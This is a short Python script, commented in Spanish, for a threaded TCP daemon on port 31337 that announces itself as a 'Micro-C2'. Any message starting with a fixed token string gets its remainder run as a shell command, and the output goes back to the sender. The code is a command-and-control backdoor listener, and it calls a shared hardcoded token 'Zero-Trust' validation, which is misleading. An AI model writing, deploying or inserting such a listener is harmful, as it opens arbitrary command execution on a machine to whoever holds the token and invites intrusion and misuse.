import socket, sys, subprocess, threading

def handle_client(conn):
    try:
        data = conn.recv(4096).decode('utf-8').strip()
        # Validación Zero-Trust
        if data.startswith("Ω_AUTH_90X:"):
            payload = data.replace("Ω_AUTH_90X:", "", 1).strip()
            
            if payload == 'ping':
                conn.sendall(b'[HADES_v\xce\xa9] PONG_SECURE (API V2 ACTIVA)\n')
            else:
                # Ejecución de comandos asíncrona y captura de STDERR/STDOUT
                out = subprocess.getoutput(payload)
                response = f"[HADES_v\xce\xa9_EXEC_OUTPUT]\n{out}\n[EOF]\n"
                conn.sendall(response.encode('utf-8'))
    except Exception as e:
        sys.stderr.write(f"[THREAD_ERR] {e}\n")
    finally:
        conn.close()

def init_daemon():
    host, port = '127.0.0.1', 31337
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((host, port))
        s.listen(10) # Ampliación de backlog para multicurrencia
        sys.stdout.write("[Ω_SYS] Micro-C2 31337 SECURE ACTIVO\n")
        sys.stdout.flush()
        
        while True:
            conn, addr = s.accept()
            # Multiplexión: Hilos independientes por conexión para evitar bloqueos
            client_thread = threading.Thread(target=handle_client, args=(conn,))
            client_thread.start()
            
    except Exception as e:
        sys.stderr.write(f"[FATAL_ERR] {e}\n")
        sys.exit(1)

if __name__ == "__main__":
    init_daemon()
